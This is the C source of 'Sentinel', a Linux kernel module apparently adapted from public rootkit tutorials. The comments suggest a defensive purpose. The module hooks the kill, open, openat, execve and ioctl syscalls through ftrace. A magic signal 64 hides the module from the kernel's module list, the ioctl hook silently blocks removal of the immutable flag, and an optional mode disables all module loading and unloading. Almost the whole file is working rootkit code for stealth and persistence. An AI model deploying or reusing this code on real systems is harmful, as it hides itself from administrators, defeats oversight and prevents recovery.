/* 
 Base code and hooks built off of open source documentation from TheXcellerator :)
 https://github.com/xcellerator/linux_kernel_hacking
 Additional features added by alphillips-lab
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/fs.h>

#include <linux/string.h>

#include "ftrace_helper.h"
#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Andrew");
MODULE_DESCRIPTION("Sentinel");
MODULE_VERSION("1.02");

/* global declarations */
//int sentinel_global_iterator = 0;

//last call to get flags
unsigned int sentinel_global_lctgf;
/*
    Race condition on sentinel_global_lctgf since it is technically possible for another
    thread to call ioctl with getflags before a setflags syscall of the same thread
    can check this variable. A little to lazy to fix this with the kernel implementation
    of hashtable, but it should be done. 
*/

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* We need these for hiding/revealing the kernel module */
static struct list_head *prev_module;
static short hidden = 0;

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_open)(const struct pt_regs *);
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_execve)(const struct pt_regs *);
static asmlinkage long (*orig_ioctl)(const struct pt_regs *);
#if SENTINEL_MODULE_PERSIST
static asmlinkage long (*orig_finit_module)(const struct pt_regs *);
static asmlinkage long (*orig_delete_module)(const struct pt_regs *);
#endif

/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle
 * we either call hideme(), showme() or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void showme(void);
    void hideme(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "sentinel: Unloading\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "sentinel: Loading\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(regs);
    }
    return 0;
}

/*
    Hook primary open syscalls and look for classic rvb files, planning to kill
    and/or redirect service processes that request these files. Example: an apache instance
    that requests this file should be logged and potentially removed.
*/
asmlinkage int hook_open(const struct pt_regs *regs) 
{
    // char __user *pathname = (char *)regs->di;

    /*
    const char *etc_passwd = "etc/passwd";
    if (strstr((const char*)pathname, etc_passwd))
        printk(KERN_INFO "sentinel: Trying to open directory with name: %s, \
        current pid: %d, current process name: %s\n", pathname, current->pid, current->comm);
    */

    return orig_open(regs);
}

asmlinkage int hook_openat(const struct pt_regs *regs) 
{
    // char __user *pathname = (char *)regs->si;

    /*
    const char *etc_passwd = "etc/passwd";
    if (strstr((const char*)pathname, etc_passwd))
        printk(KERN_INFO "sentinel: Trying to open directory with name: %s, \
        current pid: %d, current process name: %s, parent pid: %d, parent name: %s \
        \n", pathname, current->pid, current->comm, current->parent->pid, current->parent->comm);
    */

    return orig_openat(regs);

}

asmlinkage int hook_execve(const struct pt_regs *regs) 
{
    //execve hook here


    return orig_execve(regs);

}

asmlinkage int hook_ioctl(const struct pt_regs *regs)
{
    void __user *arg = (void __user *)regs->dx;
    unsigned int flags;
    int sentinel_ret = 0;

    if (regs->si == FS_IOC_GETFLAGS)
    {
        sentinel_ret = orig_ioctl(regs);
        if (copy_from_user(&flags, arg, sizeof(flags)))
            return -EFAULT; //copied from btrfs driver code fs/btrfs/ioctl.c
        sentinel_global_lctgf = flags;
        //printk(KERN_INFO "sentinel: GETFLAGS ioctl called %d\n", sentinel_global_lctgf);
        return sentinel_ret;
    }
    else if (regs->si == FS_IOC_SETFLAGS)
    {
        if (copy_from_user(&flags, arg, sizeof(flags)))
            return -EFAULT; //copied from btrfs driver code fs/btrfs/ioctl.c
        if ( (sentinel_global_lctgf & FS_IMMUTABLE_FL) && 
            (sentinel_global_lctgf ^ flags) & FS_IMMUTABLE_FL )
        {
            //printk(KERN_INFO "sentinel: immutable removal attempt\n");
            return 0;
        }
    }
    sentinel_ret = orig_ioctl(regs);
    return sentinel_ret;
}

#if SENTINEL_MODULE_PERSIST
asmlinkage int hook_finit_module(const struct pt_regs *regs)
{
    return 0;
}

asmlinkage int hook_delete_module(const struct pt_regs *regs)
{
    return 0;
}
#endif

#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);
static asmlinkage int (*orig_open)(const char __user *filename, int flags, umode_t mode);
static asmlinkage int (*orig_openat)(int dfd, const char __user *filename, 
                                    int flags, umode_t mode);
static asmlinkage long (*orig_execve)(const char __user *filename, 
                        const char __user *const __user *argv, 
                        const char __user *const __user *envp);


asmlinkage int hook_kill(pid_t pid, int sig)
{
    void showme(void);
    void hideme(void);

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "sentinel: Unloading\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "sentinel: Loading\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(pid, sig);
    }
    return 0;
}

asmlinkage int hook_open(const char __user *filename, int flags, umode_t mode) 
{
    // char __user *pathname = (char *)regs->di;

    /*
    const char *etc_passwd = "etc/passwd";
    if (strstr((const char*)pathname, etc_passwd))
        printk(KERN_INFO "sentinel: Trying to open directory with name: %s, \
        current pid: %d, current process name: %s\n", pathname, current->pid, current->comm);
    */

    return orig_open(filename, flags, mode);
}

asmlinkage int hook_openat(int dfd, const char __user *filename, int flags, umode_t mode) 
{
    // char __user *pathname = (char *)regs->si;

    /*
    const char *etc_passwd = "etc/passwd";
    if (strstr((const char*)pathname, etc_passwd))
        printk(KERN_INFO "sentinel: Trying to open directory with name: %s, \
        current pid: %d, current process name: %s, parent pid: %d, parent name: %s \
        \n", pathname, current->pid, current->comm, current->parent->pid, current->parent->comm);
    */

    return orig_openat(dfd, filename, flags, mode);

}

asmlinkage long hook_execve(const char __user *filename, 
                        const char __user *const __user *argv, 
                        const char __user *const __user *envp)
{
    //printk(KERN_INFO "sentinel: Kernel version under 4.17 working execve hook: %s\n",current->comm);
    return orig_execve(filename, argv, envp);
}
#endif

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}



/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill",   hook_kill,   &orig_kill),
    HOOK("sys_open",   hook_open,   &orig_open),
    HOOK("sys_openat", hook_openat, &orig_openat),
    HOOK("sys_execve", hook_execve, &orig_execve),
    HOOK("sys_ioctl",  hook_ioctl,  &orig_ioctl),
#if SENTINEL_MODULE_PERSIST
    HOOK("sys_finit_module", hook_finit_module, &orig_finit_module),
    HOOK("sys_delete_module",  hook_delete_module,  &orig_delete_module),
#endif
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "sentinel: Installed\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "sentinel: Uninstalling\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);